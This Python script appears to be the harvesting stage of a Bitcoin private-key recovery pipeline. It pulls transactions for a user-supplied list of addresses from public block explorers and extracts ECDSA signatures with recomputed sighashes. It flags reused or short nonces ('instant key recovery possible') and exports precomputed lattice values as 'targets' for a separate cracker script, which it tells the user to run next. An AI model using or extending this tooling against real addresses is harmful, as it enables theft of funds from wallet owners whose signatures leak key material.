"""
BIASED NONCE LATTICE ANALYZER v4.0
===================================
Extracts ECDSA signatures from Bitcoin addresses via Mempool.space API,
detects nonce reuse and bias, and exports targets for the lattice cracker.

Features:
  - Strict DER ASN.1 decoding
  - Legacy (P2PKH) + SegWit (P2WPKH) sighash computation
  - R-value reuse detection (instant private key recovery indicator)
  - Nonce bias statistics (bit-length distribution)
  - Rich, informative terminal output
  - Graceful Ctrl+C handling with progress save
"""
import requests, time, os, sys, signal, json, hashlib, re
from typing import List, Dict, Optional, Tuple
from collections import defaultdict, Counter

# ==============================================================================
# SECP256K1 CONSTANTS & GLOBALS
# ==============================================================================
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
N_HALF = N >> 1
_SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
REQ_TIMEOUT = 20
MAX_RETRIES = 10
MAX_TRANSACTIONS = 0

EXIT_FLAG = False
SESSION = requests.Session()
SESSION.headers.update({"User-Agent": "LatticeAnalyzer/4.0"})
MIN_SIGS_REQUIRED = 3

# ==============================================================================
# DISPLAY HELPERS
# ==============================================================================
def _box(title, lines, width=68, char="═"):
    """Print a bordered box with title and content lines."""
    print(f"\n  ╔{char * width}╗")
    print(f"  ║  {title:<{width - 2}}║")
    print(f"  ╠{'─' * width}╣")
    for line in lines:
        text = line[:width - 2]
        print(f"  ║  {text:<{width - 2}}║")
    print(f"  ╚{char * width}╝")

def _bar(current, total, width=30, label=""):
    """Return a progress bar string."""
    pct = current / total if total > 0 else 0
    filled = int(width * pct)
    bar = "█" * filled + "░" * (width - filled)
    return f"{label}[{bar}] {current}/{total} ({pct:.0%})"

def _short_hex(h, n=10):
    """Shorten a hex string for display."""
    if len(h) <= n * 2 + 3:
        return h
    return h[:n] + "..." + h[-n:]

# ==============================================================================
# GRACEFUL SHUTDOWN
# ==============================================================================
PROCESSING_STARTED = False

def signal_handler(sig, frame):
    global EXIT_FLAG
    if not PROCESSING_STARTED or EXIT_FLAG:
        print("\n  ⚠  Force quitting immediately...")
        os._exit(1)
    print("\n\n  ⚠  Ctrl+C detected — finishing current address, then stopping... (Press Ctrl+C again to force quit)")
    EXIT_FLAG = True

signal.signal(signal.SIGINT, signal_handler)

# ==============================================================================
# MEMPOOL API — PAGINATED TRANSACTION FETCH
# ==============================================================================
API_ENDPOINTS = [
    "https://mempool.space/api",
    "https://blockstream.info/api",
]
current_api_index = 0

def fetch_all_transactions(address: str) -> List[dict]:
    global current_api_index
    out = []
    last_txid = None
    attempts = 0

    while attempts < MAX_RETRIES and not EXIT_FLAG:
        try:
            base_url = API_ENDPOINTS[current_api_index]
            if last_txid:
                url = f"{base_url}/address/{address}/txs/chain/{last_txid}"
            else:
                url = f"{base_url}/address/{address}/txs"

            r = SESSION.get(url, timeout=REQ_TIMEOUT)

            if r.status_code == 200:
                txs = r.json()
                if not txs:
                    break
                out.extend(txs)
                last_txid = txs[-1].get("txid")
                attempts = 0

                domain = base_url.split('//')[1].split('/')[0]
                print(f"\r    📡 Fetched {len(out)} transactions... (via {domain})", end="", flush=True)

                if MAX_TRANSACTIONS > 0 and len(out) >= MAX_TRANSACTIONS:
                    out = out[:MAX_TRANSACTIONS]
                    break

                if len(txs) < 25:
                    break

                time.sleep(1.5)  # Slightly longer sleep to prevent hitting rate limit quickly
            elif r.status_code in (429, 403):
                # Switch API endpoint on rate limit (403 is often Cloudflare WAF block)
                current_api_index = (current_api_index + 1) % len(API_ENDPOINTS)
                attempts += 1
                wait = min(2 ** attempts, 15)
                print(f"\r    ⏳ Rate limited ({r.status_code}), switching to {API_ENDPOINTS[current_api_index]} and waiting {wait}s...", end="", flush=True)
                time.sleep(wait)
            elif r.status_code in (500, 502, 503, 504):
                attempts += 1
                current_api_index = (current_api_index + 1) % len(API_ENDPOINTS)
                time.sleep(min(2 ** attempts, 10))
            else:
                print(f"\r    ❌ API returned HTTP {r.status_code}", flush=True)
                break
        except requests.exceptions.Timeout:
            attempts += 1
            current_api_index = (current_api_index + 1) % len(API_ENDPOINTS)
            print(f"\r    ⏳ Timeout, switching API and retrying ({attempts}/{MAX_RETRIES})...", end="", flush=True)
            time.sleep(2)
        except requests.exceptions.ConnectionError:
            attempts += 1
            current_api_index = (current_api_index + 1) % len(API_ENDPOINTS)
            print(f"\r    ⏳ Connection error, switching API and retrying ({attempts}/{MAX_RETRIES})...", end="", flush=True)
            time.sleep(3)
        except Exception as e:
            attempts += 1
            time.sleep(2)

    if attempts >= MAX_RETRIES:
        print(f"\n    ❌ Max retries ({MAX_RETRIES}) exhausted", flush=True)

    print()  # newline after progress
    return out

# ==============================================================================
# STRICT DER DECODING & PUBKEY EXTRACTION
# ==============================================================================
def parse_der_sig(sig_hex: str) -> Optional[Tuple[int, int, int]]:
    """Strict byte-level ASN.1 DER signature decoder."""
    try:
        b = bytes.fromhex(sig_hex)
        if len(b) < 8:
            return None
        if b[0] != 0x30:
            return None

        len_sig = b[1]
        if len_sig + 2 > len(b):
            return None

        # R integer
        if b[2] != 0x02:
            return None
        len_r = b[3]
        if 4 + len_r > len(b):
            return None
        r = int.from_bytes(b[4:4 + len_r], 'big')

        # S integer
        idx_s_marker = 4 + len_r
        if idx_s_marker >= len(b) or b[idx_s_marker] != 0x02:
            return None
        len_s = b[idx_s_marker + 1]
        s_start = idx_s_marker + 2
        if s_start + len_s > len(b):
            return None
        s = int.from_bytes(b[s_start:s_start + len_s], 'big')

        # Sighash flag — last byte outside the DER structure
        sighash_idx = s_start + len_s
        sighash_flag = b[sighash_idx] if sighash_idx < len(b) else 1

        # Validate ranges
        if r <= 0 or r >= N or s <= 0 or s >= N:
            return None

        return (r, s, sighash_flag)
    except Exception:
        return None


def extract_pubkey_from_scriptsig(script_hex: str) -> Optional[str]:
    """Extract compressed or uncompressed pubkey from a scriptSig using push-data opcodes."""
    if not script_hex:
        return None
    hexstr = script_hex.lower()
    # 33-byte compressed key: push opcode 0x21 followed by 02/03 prefix
    match = re.search(r'21((?:02|03)[0-9a-f]{64})', hexstr)
    if match:
        return match.group(1)
    # 65-byte uncompressed key: push opcode 0x41 followed by 04 prefix
    match = re.search(r'41(04[0-9a-f]{128})', hexstr)
    if match:
        return match.group(1)
    return None


def extract_der_from_scriptsig(script_hex: str) -> Optional[Tuple[int, int, int]]:
    """Extract DER signature from scriptSig by following push-data opcodes."""
    try:
        b = bytes.fromhex(script_hex)
        pos = 0
        while pos < len(b):
            # Read push length
            push_len = b[pos]
            pos += 1
            if push_len == 0 or pos + push_len > len(b):
                break
            chunk = b[pos:pos + push_len]
            pos += push_len
            # Try to parse as DER signature
            if chunk[0] == 0x30 and len(chunk) >= 8:
                parsed = parse_der_sig(chunk.hex())
                if parsed:
                    return parsed
    except Exception:
        pass
    return None


# ==============================================================================
# SIGHASH CALCULATION
# ==============================================================================
def varint(n: int) -> bytes:
    if n < 0xfd:
        return n.to_bytes(1, 'little')
    elif n <= 0xffff:
        return b'\xfd' + n.to_bytes(2, 'little')
    elif n <= 0xffffffff:
        return b'\xfe' + n.to_bytes(4, 'little')
    else:
        return b'\xff' + n.to_bytes(8, 'little')


def _dsha256(data: bytes) -> bytes:
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()


def compute_legacy_sighash(tx: dict, vin_idx: int, sighash_flag: int) -> Optional[int]:
    """Compute sighash for legacy P2PKH inputs.
    Supports SIGHASH_ALL(1), SIGHASH_NONE(2), SIGHASH_SINGLE(3),
    and ANYONECANPAY variants (0x81, 0x82, 0x83)."""
    base_type = sighash_flag & 0x1f  # lower 5 bits: ALL=1, NONE=2, SINGLE=3
    anyone_can_pay = (sighash_flag & 0x80) != 0
    if base_type not in (1, 2, 3):
        return None
    try:
        ser = int(tx.get("version", 1)).to_bytes(4, "little")
        vins = tx.get("vin", [])
        vouts = tx.get("vout", [])

        # --- Inputs ---
        if anyone_can_pay:
            # Only include the signing input
            ser += varint(1)
            inp = vins[vin_idx]
            ser += bytes.fromhex(inp.get("txid", ""))[::-1]
            ser += int(inp.get("vout", 0)).to_bytes(4, "little")
            script_bytes = bytes.fromhex((inp.get("prevout") or {}).get("scriptpubkey", ""))
            ser += varint(len(script_bytes)) + script_bytes
            ser += int(inp.get("sequence", 0xffffffff)).to_bytes(4, "little")
        else:
            ser += varint(len(vins))
            for i, inp in enumerate(vins):
                ser += bytes.fromhex(inp.get("txid", ""))[::-1]
                ser += int(inp.get("vout", 0)).to_bytes(4, "little")
                if i == vin_idx:
                    script_bytes = bytes.fromhex((inp.get("prevout") or {}).get("scriptpubkey", ""))
                    ser += varint(len(script_bytes)) + script_bytes
                else:
                    ser += b"\x00"
                # SIGHASH_NONE and SIGHASH_SINGLE: non-signing inputs get sequence 0
                if i == vin_idx or base_type == 1:
                    ser += int(inp.get("sequence", 0xffffffff)).to_bytes(4, "little")
                else:
                    ser += (0).to_bytes(4, "little")

        # --- Outputs ---
        if base_type == 1:  # SIGHASH_ALL: serialize all outputs normally
            ser += varint(len(vouts))
            for out in vouts:
                ser += int(out.get("value", 0)).to_bytes(8, "little")
                script_bytes = bytes.fromhex(out.get("scriptpubkey", ""))
                ser += varint(len(script_bytes)) + script_bytes
        elif base_type == 2:  # SIGHASH_NONE: no outputs
            ser += varint(0)
        elif base_type == 3:  # SIGHASH_SINGLE: only the output at vin_idx
            if vin_idx >= len(vouts):
                return None  # SIGHASH_SINGLE with no matching output is undefined
            ser += varint(vin_idx + 1)
            # Blank outputs before vin_idx
            for i in range(vin_idx):
                ser += b"\xff" * 8  # -1 value (0xffffffffffffffff)
                ser += varint(0)    # empty script
            # The matching output
            out = vouts[vin_idx]
            ser += int(out.get("value", 0)).to_bytes(8, "little")
            script_bytes = bytes.fromhex(out.get("scriptpubkey", ""))
            ser += varint(len(script_bytes)) + script_bytes

        ser += int(tx.get("locktime", 0)).to_bytes(4, "little")
        ser += sighash_flag.to_bytes(4, "little")
        return int.from_bytes(_dsha256(ser), "big")
    except Exception:
        return None


def compute_bip143_sighash(tx: dict, vin_idx: int, sighash_flag: int) -> Optional[int]:
    """Compute sighash for SegWit P2WPKH inputs (BIP-143).
    Supports SIGHASH_ALL(1), SIGHASH_NONE(2), SIGHASH_SINGLE(3),
    and ANYONECANPAY variants (0x81, 0x82, 0x83)."""
    base_type = sighash_flag & 0x1f
    anyone_can_pay = (sighash_flag & 0x80) != 0
    if base_type not in (1, 2, 3):
        return None
    try:
        vins = tx.get("vin", [])
        vouts = tx.get("vout", [])
        txin = vins[vin_idx]
        prevout = txin.get("prevout") or {}

        # hashPrevouts: 0x00*32 if ANYONECANPAY, else hash of all outpoints
        if anyone_can_pay:
            hashPrevouts = b"\x00" * 32
        else:
            hashPrevouts = _dsha256(b"".join([
                bytes.fromhex(inp.get("txid", ""))[::-1] +
                int(inp.get("vout", 0)).to_bytes(4, "little")
                for inp in vins
            ]))

        # hashSequence: 0x00*32 if ANYONECANPAY or NONE or SINGLE
        if anyone_can_pay or base_type in (2, 3):
            hashSequence = b"\x00" * 32
        else:
            hashSequence = _dsha256(b"".join([
                int(inp.get("sequence", 0xffffffff)).to_bytes(4, "little")
                for inp in vins
            ]))

        # hashOutputs: depends on sighash type
        if base_type == 1:  # ALL
            hashOutputs = _dsha256(b"".join([
                int(out.get("value", 0)).to_bytes(8, "little") +
                varint(len(bytes.fromhex(out.get("scriptpubkey", "")))) +
                bytes.fromhex(out.get("scriptpubkey", ""))
                for out in vouts
            ]))
        elif base_type == 3 and vin_idx < len(vouts):  # SINGLE
            out = vouts[vin_idx]
            hashOutputs = _dsha256(
                int(out.get("value", 0)).to_bytes(8, "little") +
                varint(len(bytes.fromhex(out.get("scriptpubkey", "")))) +
                bytes.fromhex(out.get("scriptpubkey", ""))
            )
        else:  # NONE, or SINGLE with no matching output
            hashOutputs = b"\x00" * 32

        # Derive hash160 for scriptCode
        spk_bytes = bytes.fromhex(prevout.get("scriptpubkey", ""))
        hash160 = b""
        if len(spk_bytes) == 22 and spk_bytes[:2] == b'\x00\x14':
            # Native P2WPKH: OP_0 <20-byte-hash>
            hash160 = spk_bytes[2:]
        elif len(spk_bytes) == 23 and spk_bytes[0] == 0xa9 and spk_bytes[1] == 0x14 and spk_bytes[-1] == 0x87:
            # P2SH-P2WPKH: extract from witness pubkey
            witness = txin.get("witness", [])
            if len(witness) >= 2:
                try:
                    h = hashlib.new('ripemd160',
                                    hashlib.sha256(bytes.fromhex(witness[1])).digest()).digest()
                    hash160 = h
                except ValueError:
                    pass
        else:
            witness = txin.get("witness", [])
            if len(witness) >= 2:
                try:
                    h = hashlib.new('ripemd160',
                                    hashlib.sha256(bytes.fromhex(witness[1])).digest()).digest()
                    hash160 = h
                except ValueError:
                    pass

        if not hash160:
            return None

        scriptCode = varint(25) + b"\x76\xa9\x14" + hash160 + b"\x88\xac"
        preimage = (
            int(tx.get("version", 2)).to_bytes(4, "little") +
            hashPrevouts + hashSequence +
            bytes.fromhex(txin.get("txid", ""))[::-1] +
            int(txin.get("vout", 0)).to_bytes(4, "little") +
            scriptCode +
            int(prevout.get("value", 0)).to_bytes(8, "little") +
            int(txin.get("sequence", 0xffffffff)).to_bytes(4, "little") +
            hashOutputs +
            int(tx.get("locktime", 0)).to_bytes(4, "little") +
            sighash_flag.to_bytes(4, "little")
        )
        return int.from_bytes(_dsha256(preimage), "big")
    except Exception:
        return None


def _modular_inverse(a: int, m: int) -> int:
    """Extended Euclidean algorithm for modular inverse."""
    if a < 0:
        a = a % m
    g, x, _ = _extended_gcd(a, m)
    if g != 1:
        raise ValueError("No modular inverse")
    return x % m

def _extended_gcd(a: int, b: int):
    if a == 0:
        return b, 0, 1
    g, x, y = _extended_gcd(b % a, a)
    return g, y - (b // a) * x, x


def compute_sighash_z(tx: dict, vin_idx: int, sighash_flag: int) -> Optional[int]:
    """Route to correct sighash computation based on input type.
    Supports P2PKH (legacy), P2WPKH (native SegWit), and P2SH-P2WPKH (wrapped SegWit)."""
    try:
        txin = tx.get("vin", [])[vin_idx]
        prevout = txin.get("prevout") or {}
    except (IndexError, KeyError):
        return None
    itype = prevout.get("scriptpubkey_type", "")

    # Native SegWit P2WPKH
    if "wpkh" in itype or itype == "v0_p2wpkh":
        return compute_bip143_sighash(tx, vin_idx, sighash_flag)

    # P2SH-P2WPKH (wrapped SegWit): has P2SH type but witness data present
    if itype in ("p2sh", "scripthash"):
        witness = txin.get("witness", [])
        if witness and len(witness) >= 2:
            # Has witness data → P2SH-P2WPKH, use BIP-143
            return compute_bip143_sighash(tx, vin_idx, sighash_flag)
        # Pure P2SH without witness — skip (not P2PKH)
        return None

    # Legacy P2PKH
    if "pkh" in itype or "pubkeyhash" in itype:
        return compute_legacy_sighash(tx, vin_idx, sighash_flag)

    # Fallback: if witness present, try BIP-143; otherwise legacy
    if txin.get("witness"):
        return compute_bip143_sighash(tx, vin_idx, sighash_flag)

    return None


# ==============================================================================
# NONCE BIAS ANALYSIS
# ==============================================================================
def analyze_nonce_bias(sigs: List[dict]) -> dict:
    """Compute statistics on r and s value bit-lengths to detect bias."""
    r_bits = []
    s_bits = []
    r_values = []

    for sig in sigs:
        r = int(sig['r'], 16)
        s = int(sig['s'], 16)
        r_bits.append(r.bit_length())
        s_bits.append(s.bit_length())
        r_values.append(r)

    # R-value reuse detection
    r_counter = Counter(r_values)
    r_reused = {r: count for r, count in r_counter.items() if count > 1}

    # Bit-length distribution
    r_min_bits = min(r_bits) if r_bits else 256
    r_max_bits = max(r_bits) if r_bits else 256
    s_min_bits = min(s_bits) if s_bits else 256
    s_max_bits = max(s_bits) if s_bits else 256

    # Count short values (potential bias indicators)
    r_short = sum(1 for b in r_bits if b < 248)
    s_short = sum(1 for b in s_bits if b < 248)

    return {
        "count": len(sigs),
        "r_min_bits": r_min_bits,
        "r_max_bits": r_max_bits,
        "s_min_bits": s_min_bits,
        "s_max_bits": s_max_bits,
        "r_short_count": r_short,
        "s_short_count": s_short,
        "r_reused": r_reused,
    }


# ==============================================================================
# MAIN ANALYSIS LOGIC
# ==============================================================================
def analyze_address(address: str, addr_idx: int, total_addrs: int) -> dict:
    """Analyze a single address. Returns a result dict."""
    result = {"address": address, "status": "skipped", "sig_count": 0, "details": ""}

    print(f"\n  {'━' * 68}")
    print(f"  ┃  📍 Address {addr_idx}/{total_addrs}: {address}")
    print(f"  {'━' * 68}")

    # Fetch transactions
    print(f"    📡 Connecting to mempool.space API...")
    t0 = time.time()
    txs = fetch_all_transactions(address)
    fetch_time = time.time() - t0

    if not txs:
        print(f"    ❌ No transactions found ({fetch_time:.1f}s)")
        result["details"] = "No transactions"
        return result

    print(f"    ✓  {len(txs)} transactions fetched in {fetch_time:.1f}s")

    # Extract signatures
    unique_sigs_by_pubkey = defaultdict(dict)
    pubkey_counter = Counter()
    skipped_sighash = 0
    skipped_parse = 0
    total_inputs = 0
    matched_inputs = 0

    for tx in txs:
        if EXIT_FLAG:
            break
        for vin_idx, txin in enumerate(tx.get("vin", [])):
            total_inputs += 1
            prevout_addr = (txin.get("prevout") or {}).get("scriptpubkey_address", "")
            if prevout_addr != address:
                continue
            matched_inputs += 1

            parsed = pubkey = None
            witness = txin.get("witness", [])

            # Try witness first (SegWit)
            if witness and len(witness) >= 2:
                pubkey = witness[1] if len(witness[1]) in (66, 130) else None
                parsed = parse_der_sig(witness[0])

            # Fallback to scriptSig (Legacy)
            if not pubkey or not parsed:
                scriptsig = txin.get("scriptsig", "")
                if isinstance(scriptsig, dict):
                    scriptsig = scriptsig.get("hex", "")
                if scriptsig:
                    pubkey = pubkey or extract_pubkey_from_scriptsig(scriptsig)
                    if not parsed:
                        parsed = extract_der_from_scriptsig(scriptsig)

            if not parsed or not pubkey:
                skipped_parse += 1
                continue

            r, s, sighash_flag = parsed
            z = compute_sighash_z(tx, vin_idx, sighash_flag)

            if z is None:
                skipped_sighash += 1
                continue

            pubkey_lower = pubkey.lower()
            key = (r, s, z)
            if key not in unique_sigs_by_pubkey[pubkey_lower]:
                # Pre-compute s_inv, A=r*s_inv, B=z*s_inv for the cracker
                try:
                    s_inv = _modular_inverse(s, N)
                    A_val = (r * s_inv) % N
                    B_val = (z * s_inv) % N
                except ValueError:
                    continue
                unique_sigs_by_pubkey[pubkey_lower][key] = {
                    "r": hex(r), "s": hex(s), "z": hex(z), "txid": tx.get("txid", ""),
                    "A": hex(A_val), "B": hex(B_val)
                }
                pubkey_counter[pubkey_lower] += 1

    if not pubkey_counter:
        print(f"    ❌ No valid signatures extracted")
        print(f"       Inputs scanned: {total_inputs} | Matched: {matched_inputs}")
        print(f"       Parse fails: {skipped_parse} | Sighash fails: {skipped_sighash}")
        result["details"] = "No valid signatures"
        return result

    primary_pubkey = pubkey_counter.most_common(1)[0][0]
    unique_sigs = unique_sigs_by_pubkey[primary_pubkey]
    sig_list = list(unique_sigs.values())
    result["sig_count"] = len(sig_list)

    # Run bias analysis
    bias = analyze_nonce_bias(sig_list)

    # Display extraction summary
    info_lines = [
        f"Pubkey:       {_short_hex(primary_pubkey, 16)}",
        f"Type:         {'Compressed' if len(primary_pubkey) == 66 else 'Uncompressed'}",
        f"Signatures:   {len(sig_list)} unique  (of {matched_inputs} inputs)",
        f"Parse fails:  {skipped_parse}  |  Sighash fails: {skipped_sighash}",
        f"",
        f"R bit-length: {bias['r_min_bits']}..{bias['r_max_bits']}  "
        f"({'⚠ SHORT' if bias['r_short_count'] > 0 else '✓ normal'})",
        f"S bit-length: {bias['s_min_bits']}..{bias['s_max_bits']}  "
        f"({'⚠ SHORT' if bias['s_short_count'] > 0 else '✓ normal'})",
    ]

    if bias['r_short_count'] > 0:
        info_lines.append(f"Short R vals: {bias['r_short_count']}/{len(sig_list)} (<248 bits)")
    if bias['s_short_count'] > 0:
        info_lines.append(f"Short S vals: {bias['s_short_count']}/{len(sig_list)} (<248 bits)")

    # R-reuse detection (critical vulnerability)
    if bias['r_reused']:
        info_lines.append("")
        info_lines.append("🚨 R-VALUE REUSE DETECTED — INSTANT KEY RECOVERY POSSIBLE")
        for r_val, count in bias['r_reused'].items():
            info_lines.append(f"   r={hex(r_val)[:20]}... reused {count}x")
        result["r_reuse"] = True
    else:
        result["r_reuse"] = False

    _box("SIGNATURE ANALYSIS", info_lines)

    # Save or skip
    reports_dir = os.path.join(_SCRIPT_DIR, "reports", "pass")
    os.makedirs(reports_dir, exist_ok=True)

    if len(sig_list) >= MIN_SIGS_REQUIRED:
        data = {
            "address": address,
            "pubkey": primary_pubkey,
            "signature_count": len(sig_list),
            "r_reuse_detected": len(bias['r_reused']) > 0,
            "r_min_bits": bias['r_min_bits'],
            "s_min_bits": bias['s_min_bits'],
            "signatures": sig_list,
        }
        filepath = os.path.join(reports_dir, f"{address}.json")
        with open(filepath, "w") as f:
            json.dump(data, f, indent=4)
        print(f"\n    ✅ PASSED → Saved to reports/pass/{address}.json")
        result["status"] = "passed"
    else:
        print(f"\n    ⛔ SKIPPED — Need ≥{MIN_SIGS_REQUIRED} sigs, got {len(sig_list)}")
        result["status"] = "skipped"
        result["details"] = f"Only {len(sig_list)} sigs"

    return result


# ==============================================================================
# MAIN ENTRY POINT
# ==============================================================================
def main():
    global MAX_TRANSACTIONS

    print()
    print("  ╔════════════════════════════════════════════════════════════════════╗")
    print("  ║          BIASED NONCE LATTICE ANALYZER v4.0                       ║")
    print("  ║          Signature Extraction & Bias Detection                    ║")
    print("  ╠════════════════════════════════════════════════════════════════════╣")
    print("  ║  API:     mempool.space (Esplora)                                 ║")
    print("  ║  Sighash: SIGHASH_ALL (Legacy P2PKH + SegWit P2WPKH)             ║")
    print("  ║  Min:     {} signatures required per address                  ║".format(
        str(MIN_SIGS_REQUIRED).ljust(4)))
    print("  ╚════════════════════════════════════════════════════════════════════╝")
    print()

    addr_file = input("  📂 Enter path to BTC addresses file: ").strip().replace('"', '')
    if not os.path.isfile(addr_file):
        print("  ❌ File not found:", addr_file)
        return

    try:
        MAX_TRANSACTIONS = int(input("  🔢 Max transactions per address (0 = no limit): ").strip())
    except ValueError:
        MAX_TRANSACTIONS = 0

    with open(addr_file, "r", encoding="utf-8") as f:
        addresses = list(set([ln.strip() for ln in f if ln.strip()]))

    if not addresses:
        print("  ❌ No addresses found in file!")
        return

    print(f"\n  📋 Loaded {len(addresses)} unique addresses")
    if MAX_TRANSACTIONS > 0:
        print(f"  📋 Transaction limit: {MAX_TRANSACTIONS} per address")
    print()

    # Process each address
    global PROCESSING_STARTED
    PROCESSING_STARTED = True
    results = []
    t0 = time.time()

    for idx, addr in enumerate(addresses):
        if EXIT_FLAG:
            print(f"\n  ⚠  Stopped by user at address {idx}/{len(addresses)}")
            break
        results.append(analyze_address(addr, idx + 1, len(addresses)))

    elapsed = time.time() - t0

    # Final summary
    passed = [r for r in results if r["status"] == "passed"]
    skipped = [r for r in results if r["status"] == "skipped"]
    r_reuse = [r for r in results if r.get("r_reuse")]

    summary_lines = [
        f"Addresses scanned:   {len(results)}/{len(addresses)}",
        f"Passed (≥{MIN_SIGS_REQUIRED} sigs):     {len(passed)}",
        f"Skipped:             {len(skipped)}",
        f"R-reuse detected:    {len(r_reuse)}  {'🚨 CRITICAL' if r_reuse else ''}",
        f"Total time:          {elapsed:.1f}s",
        f"",
        f"Output directory:    reports/pass/",
    ]

    if passed:
        summary_lines.append("")
        summary_lines.append("Passed targets:")
        for r in passed:
            flag = " 🚨R-REUSE" if r.get("r_reuse") else ""
            summary_lines.append(f"  {r['address'][:20]}... ({r['sig_count']} sigs){flag}")

    _box("SCAN COMPLETE", summary_lines)

    if passed:
        print(f"\n  💡 Next step: Run the cracker on the extracted targets")
        print(f"     sage cracker.py")
    print()


if __name__ == "__main__":
    main()